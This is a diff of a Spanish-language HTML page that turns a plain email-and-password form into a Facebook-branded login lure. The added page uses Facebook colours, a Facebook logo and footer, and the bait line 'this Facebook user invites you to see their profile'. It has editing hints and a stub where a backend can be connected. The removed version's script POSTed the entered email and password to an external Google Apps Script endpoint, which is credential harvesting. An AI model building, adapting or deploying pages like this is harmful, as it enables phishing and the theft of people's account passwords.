@@ -1,166 +1,779 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Formulario</title>
+  <meta charset="UTF-8">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
+
+  <!-- =====================================================
+       ✏️ EDITAR AQUÍ: TÍTULO DE LA PESTAÑA
+       ===================================================== -->
+
+  <title>Mi formulario</title>
+
 
   <style>
+
+    /* =========================================================
+       🎨🎨🎨 PERSONALIZACIÓN
+       
+       MODIFICA AQUÍ COLORES, FONDO, TAMAÑOS, ETC.
+       ========================================================= */
+
+    :root {
+
+      /* ✏️ COLOR PRINCIPAL */
+      --color-principal: #1877f2;
+
+      /* ✏️ COLOR DEL BOTÓN */
+      --color-boton: #1877f2;
+
+      /* ✏️ COLOR DEL BOTÓN AL PASAR EL RATÓN */
+      --color-boton-hover: #166fe5;
+
+      /* ✏️ COLOR DEL TEXTO */
+      --color-texto: #1c1e21;
+
+      /* ✏️ COLOR DEL TEXTO SECUNDARIO */
+      --color-texto-secundario: #65676b;
+
+      /* ✏️ COLOR DEL INTERIOR DE LOS CAMPOS */
+      --color-input: #f5f6f7;
+
+      /* ✏️ COLOR DEL BORDE DE LOS CAMPOS */
+      --color-borde: #dddfe2;
+
+      /* ✏️ COLOR DEL FONDO */
+      --color-fondo: #f0f2f5;
+
+
+      /* =====================================================
+         🖼️ IMAGEN DE FONDO
+         
+         Para poner una imagen cambia "none" por:
+
+         url("fondo.jpg")
+
+         ===================================================== */
+
+      --imagen-fondo: none;
+
+
+      /* =====================================================
+         🌈 FONDO DEGRADADO
+         ===================================================== */
+
+      --fondo-degradado:
+        linear-gradient(
+          135deg,
+          #eef4ff 0%,
+          #f0f2f5 50%,
+          #ffffff 100%
+        );
+
+
+      /* ✏️ REDONDEADO DEL FORMULARIO */
+      --radio-formulario: 14px;
+
+      /* ✏️ REDONDEADO DE LOS CAMPOS */
+      --radio-input: 8px;
+
+      /* ✏️ REDONDEADO DEL BOTÓN */
+      --radio-boton: 8px;
+
+
+      /* ✏️ SOMBRA */
+
+      --sombra:
+        0 8px 30px rgba(0, 0, 0, 0.12);
+
+
+      /* ✏️ ANCHO DEL FORMULARIO */
+
+      --ancho-formulario: 400px;
+
+
+      /* ✏️ TIPO DE LETRA */
+
+      --fuente:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    }
+
+
+
+    /* =========================================================
+       RESET
+       ========================================================= */
+
     * {
       box-sizing: border-box;
     }
 
+
+
+    /* =========================================================
+       CUERPO
+       ========================================================= */
+
     body {
+
       margin: 0;
+
       min-height: 100vh;
+
       display: flex;
+
       justify-content: center;
+
       align-items: center;
-      background: #f4f4f4;
-      font-family: Arial, sans-serif;
+
+      padding: 20px;
+
+      font-family: var(--fuente);
+
+
+      /* =====================================================
+         ✏️ FONDO
+         ===================================================== */
+
+      background:
+        var(--imagen-fondo),
+        var(--fondo-degradado);
+
+      background-size: cover;
+
+      background-position: center;
+
+      background-repeat: no-repeat;
+
     }
+
+
+
+    /* =========================================================
+       FORMULARIO
+       ========================================================= */
 
     .formulario {
-      width: 90%;
-      max-width: 400px;
-      background: white;
+
+      width: 100%;
+
+      max-width:
+        var(--ancho-formulario);
+
+      background: #ffffff;
+
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+
+      border-radius:
+        var(--radio-formulario);
+
+      box-shadow:
+        var(--sombra);
+
     }
+
+
+
+    /* =========================================================
+       🏷️ LOGO / NOMBRE
+       
+       ✏️ EDITA "MiMarca" EN EL HTML DE ABAJO
+       ========================================================= */
+
+    .logo {
+
+      text-align: center;
+
+      font-size: 38px;
+
+      font-weight: bold;
+
+      color:
+        var(--color-principal);
+
+      margin-bottom: 15px;
+
+    }
+
+
+
+    /* =========================================================
+       🖼️ MINIATURAS
+       ========================================================= */
+
+    .miniaturas {
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+      gap: 10px;
+
+      flex-wrap: wrap;
+
+      margin-bottom: 25px;
+
+    }
+
+
+    /* =========================================================
+       ✏️ EDITAR: TAMAÑO DE LAS MINIATURAS
+       ========================================================= */
+
+    .miniaturas img {
+
+      width: 65px;
+
+      height: 65px;
+
+      object-fit: cover;
+
+      border-radius: 12px;
+
+      border: 2px solid #eeeeee;
+
+      box-shadow:
+        0 2px 8px rgba(0, 0, 0, 0.12);
+
+      cursor: pointer;
+
+      transition:
+        transform 0.2s,
+        box-shadow 0.2s;
+
+    }
+
+
+    /* =====================================================
+       ✏️ EFECTO DE LAS MINIATURAS
+       ===================================================== */
+
+    .miniaturas img:hover {
+
+      transform:
+        translateY(-3px)
+        scale(1.05);
+
+      box-shadow:
+        0 5px 12px rgba(0, 0, 0, 0.18);
+
+    }
+
+
+
+    /* =========================================================
+       TÍTULO
+       ========================================================= */
 
     h1 {
+
       text-align: center;
-      margin-top: 0;
-      margin-bottom: 25px;
+
+      /* ✏️ TAMAÑO */
+      font-size: 24px;
+
+      /* ✏️ COLOR */
+      color:
+        var(--color-texto);
+
+      margin:
+        0 0 8px 0;
+
     }
 
-    label {
-      display: block;
-      margin-bottom: 7px;
-      font-weight: bold;
+
+
+    /* =========================================================
+       DESCRIPCIÓN
+       ========================================================= */
+
+    .descripcion {
+
+      text-align: center;
+
+      color:
+        var(--color-texto-secundario);
+
+      font-size: 15px;
+
+      line-height: 1.4;
+
+      margin:
+        0 0 25px 0;
+
     }
+
+
+
+    /* =========================================================
+       📝 CAMPOS
+       
+       NO HAY LABELS.
+       SOLO SE MOSTRARÁ EL PLACEHOLDER.
+       ========================================================= */
 
     input {
+
       width: 100%;
-      padding: 12px;
-      margin-bottom: 18px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
+
+      padding:
+        13px 14px;
+
+      margin-bottom: 17px;
+
+      background:
+        var(--color-input);
+
+      border:
+        1px solid var(--color-borde);
+
+      border-radius:
+        var(--radio-input);
+
       font-size: 16px;
+
+      color:
+        var(--color-texto);
+
+      outline: none;
+
+      transition:
+        border-color 0.2s,
+        box-shadow 0.2s,
+        background 0.2s;
+
     }
+
+
+
+    /* =========================================================
+       ✏️ PLACEHOLDER
+       ========================================================= */
+
+    input::placeholder {
+
+      color:
+        #8a8d91;
+
+      opacity: 1;
+
+    }
+
+
+
+    /* =========================================================
+       INPUT SELECCIONADO
+       ========================================================= */
+
+    input:focus {
+
+      background:
+        #ffffff;
+
+      border-color:
+        var(--color-principal);
+
+      box-shadow:
+        0 0 0 2px
+        rgba(24, 119, 242, 0.15);
+
+    }
+
+
+
+    /* =========================================================
+       🔵 BOTÓN
+       ========================================================= */
 
     button {
+
       width: 100%;
+
       padding: 13px;
+
       border: none;
-      border-radius: 6px;
-      background: #111;
-      color: white;
+
+      border-radius:
+        var(--radio-boton);
+
+      background:
+        var(--color-boton);
+
+      color:
+        #ffffff;
+
       font-size: 16px;
+
+      font-weight: bold;
+
       cursor: pointer;
+
+      transition:
+        background 0.2s,
+        transform 0.1s;
+
     }
+
+
+
+    /* =========================================================
+       ✏️ BOTÓN AL PASAR EL RATÓN
+       ========================================================= */
+
+    button:hover {
+
+      background:
+        var(--color-boton-hover);
+
+    }
+
+
+
+    button:active {
+
+      transform:
+        scale(0.99);
+
+    }
+
+
 
     button:disabled {
+
       opacity: 0.6;
+
       cursor: not-allowed;
+
+      transform: none;
+
     }
+
+
+
+    /* =========================================================
+       MENSAJE
+       ========================================================= */
 
     #mensaje {
+
       text-align: center;
+
       margin-top: 15px;
+
+      color:
+        var(--color-texto-secundario);
+
+      font-size: 14px;
+
     }
-  </style>
-</head>
 
-<body>
 
-  <form class="formulario" id="formulario">
 
-    <h1>Formulario</h1>
+    /* =========================================================
+       PIE
+       ========================================================= */
 
-    <label for="nombre">Email</label>
-    <input
-      type="text"
-      id="nombre"
-      name="nombre"
-      required
-    >
+    .pie {
 
-    <label for="apellidos">Contraseña</label>
-    <input
-      type="password"
-      id="apellidos"
-      name="apellidos"
-      required
-    >
+      text-align: center;
 
-    <button type="submit" id="boton">
-      Enviar
-    </button>
+      margin-top: 22px;
 
-    <div id="mensaje"></div>
+      font-size: 13px;
 
-  </form>
+      color:
+        var(--color-texto-secundario);
 
-  <script>
+    }
 
-    const URL_APPS_SCRIPT =
-      "https://script.google.com/macros/s/AKfycbxgdUDgb3LbU1OVU0IprMlCoa0mMh1TITkwcvPmvBuYIjSxgXoUXHCT0ndX_DLtmeHy/exec";
 
-    const formulario = document.getElementById("formulario");
-    const boton = document.getElementById("boton");
-    const mensaje = document.getElementById("mensaje");
 
-    formulario.addEventListener("submit", async function(event) {
+    /* =========================================================
+       📱 MÓVIL
+       ========================================================= */
 
-      event.preventDefault();
+    @media (max-width: 480px) {
 
-      boton.disabled = true;
-      boton.textContent = "Enviando...";
-      mensaje.textContent = "";
+      body {
 
-      const datos = {
-        nombre: document.getElementById("nombre").value.trim(),
-        apellidos: document.getElementById("apellidos").value.trim()
-      };
-
-      try {
-
-        const respuesta = await fetch(URL_APPS_SCRIPT, {
-          method: "POST",
-          body: JSON.stringify(datos)
-        });
-
-        const resultado = await respuesta.json();
-
-        if (resultado.ok) {
-
-          mensaje.textContent = "¡Formulario enviado correctamente!";
-          formulario
-        } else {
-
-          mensaje.textContent =
-            resultado.mensaje || "Ha ocurrido un error.";
-
-        }
-
-      } catch (error) {
-
-        console.error(error);
-
-        mensaje.textContent =
-          "No se pudo enviar el formulario.";
+        padding: 15px;
 
       }
 
-      boton.disabled = false;
-      boton.textContent = "Enviar";
 
-    });
+      .formulario {
+
+        padding:
+          24px 20px;
+
+      }
+
+
+      .logo {
+
+        font-size: 34px;
+
+      }
+
+
+      h1 {
+
+        font-size: 22px;
+
+      }
+
+
+      .miniaturas img {
+
+        width: 58px;
+
+        height: 58px;
+
+      }
+
+    }
+
+  </style>
+
+</head>
+
+
+
+<body>
+
+
+  <!-- =======================================================
+       📦 FORMULARIO
+       ======================================================= -->
+
+  <form
+    class="formulario"
+    id="formulario"
+  >
+
+
+    <!-- =====================================================
+         ✏️ EDITAR AQUÍ: NOMBRE / LOGO
+         ===================================================== -->
+
+    <div class="logo">
+
+      Facebook
+
+    </div>
+
+
+
+    <!-- =====================================================
+         🖼️ MINIATURAS
+         
+         ✏️ CAMBIA LAS RUTAS DE LAS IMÁGENES
+         
+         Ejemplo:
+         imagen1.jpg
+         
+         O:
+         imagenes/foto1.jpg
+         ===================================================== -->
+
+    <div class="miniaturas">
+
+
+      <!-- ✏️ IMAGEN 1 -->
+
+      <img
+        src="https://i.imgur.com/rOJmF5v.jpeg"
+        alt="Imagen 1"
+      >
+
+
+
+
+    <!-- =====================================================
+         ✏️ EDITAR AQUÍ: TÍTULO
+         ===================================================== -->
+
+    <h1>
+
+    
+
+    </h1>
+
+
+
+    <!-- =====================================================
+         ✏️ EDITAR AQUÍ: DESCRIPCIÓN
+         ===================================================== -->
+
+    <p class="descripcion">
+
+  Este usuario de Facebook te invita a ver su perfil.¿lo conoces?
+
+    </p>
+
+
+
+    <!-- =====================================================
+         📝 CAMPO 1
+         
+         ✏️ SOLO CAMBIA EL PLACEHOLDER
+         ===================================================== -->
+
+    <input
+      type="email"
+      id="email"
+      name="email"
+      placeholder="Email"
+      required
+    >
+
+
+
+    <!-- =====================================================
+         📝 CAMPO 2
+         
+         ✏️ SOLO CAMBIA EL PLACEHOLDER
+         ===================================================== -->
+
+    <input
+      type="password"
+      id="dato"
+      name="dato"
+      placeholder="Contraseña"
+      required
+    >
+
+
+
+    <!-- =====================================================
+         ✏️ EDITAR AQUÍ: TEXTO DEL BOTÓN
+         ===================================================== -->
+
+    <button
+      type="submit"
+      id="boton"
+    >
+
+      Enviar
+
+    </button>
+
+
+
+    <!-- =====================================================
+         MENSAJE
+         ===================================================== -->
+
+    <div id="mensaje"></div>
+
+
+
+    <!-- =====================================================
+         ✏️ EDITAR AQUÍ: TEXTO DEL PIE
+         ===================================================== -->
+
+    <div class="pie">
+
+      © www.Facebook.com
+
+    </div>
+
+
+  </form>
+
+
+
+  <!-- =======================================================
+       JAVASCRIPT
+       ======================================================= -->
+
+  <script>
+
+
+    const formulario =
+      document.getElementById("formulario");
+
+
+    const boton =
+      document.getElementById("boton");
+
+
+    const mensaje =
+      document.getElementById("mensaje");
+
+
+
+    formulario.addEventListener(
+      "submit",
+      function(event) {
+
+
+        event.preventDefault();
+
+
+        boton.disabled = true;
+
+
+        /* ✏️ TEXTO MIENTRAS PROCESA */
+
+        boton.textContent =
+          "Procesando...";
+
+
+        mensaje.textContent =
+          "";
+
+
+
+        /*
+         * =====================================================
+         * AQUÍ PUEDES CONECTAR TU PROPIO SISTEMA
+         * =====================================================
+         *
+         * Para una aplicación real, utiliza un backend
+         * propio y un mecanismo seguro de autenticación.
+         */
+
+
+
+        setTimeout(function() {
+
+
+          /* ✏️ MENSAJE DE ÉXITO */
+
+          mensaje.textContent =
+            "¡Solicitud enviada correctamente!";
+
+
+          boton.disabled =
+            false;
+
+
+          /* ✏️ TEXTO DEL BOTÓN */
+
+          boton.textContent =
+            "Continuar";
+
+
+        }, 800);
+
+
+      }
+
+    );
 
   </script>
+
 
 </body>
 </html>
